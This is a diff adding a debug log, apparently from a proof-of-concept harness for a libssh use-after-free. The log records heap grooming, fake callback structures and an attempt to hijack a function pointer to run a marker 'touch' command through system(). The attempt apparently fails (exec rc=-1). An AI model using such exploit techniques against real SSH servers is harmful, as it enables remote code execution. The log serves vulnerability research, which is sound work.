@@ -1,0 +1,22 @@
+[2026/11/25 16:51:20.416616, 1] ssh_strict_fopen:  Failed to open a file /etc/ssh/ssh_known_hosts for reading: No such file or directory
+SERVER auth len user=5 pass=9 success=0
+CLIENT auth rc=0
+SERVER registered callbacks on channel 43
+CLIENT channel local=43 remote=43
+SERVER data #1 len=12 first=f 
+CLIENT realsystem fn=0x705377c58750 sess=0x58b8ff692dd0 cmd=touch evidence-wire-vuln-groom-realsystem.marker bad=0
+CLIENT sent call fn=0x705377c58750 bad=0
+CLIENT sent groom wire pointer=0x58b8ff6a3890 survive=1
+CLIENT sent close+data marker=MISHE-LIBSSH-UAF-WIRE
+SERVER close callback
+SERVER data #2 len=128 first=Ð off16=-
+SERVER groom-survive saved_buf=0x58b930470b50 saved_cbs=0x58b93046e1d0 first=0x58b930470690
+[2026/11/25 16:51:21.604154, 1] ssh_socket_exception_callback:  Socket exception callback: 2 (32)
+SERVER groom alloc=0x58b930470ac0 wire_off120=0x58b8ff6a3890 target=0x58b8ff6a3890 survive=1
+SERVER call fake_cbs=0x58b93046e410 node=0x58b930470bc0 fn=0x705377c58750 first=0x58b930470690
+SERVER REALSYS armed fn=0x705377c58750 sess=0x58b8ff692dd0 cmd=touch evidence-wire-vuln-groom-realsystem.marker
+SERVER done data_packets=2 marker_hits=0
+SERVER exec rc=-1
+SERVER target_after=0x41414141414141c1 groom_ptr=0x58b930470ac0
+SERVER survive buf_len=0 saved=0x58b930470b50
+CLIENT rc=0 SERVER status=0x0
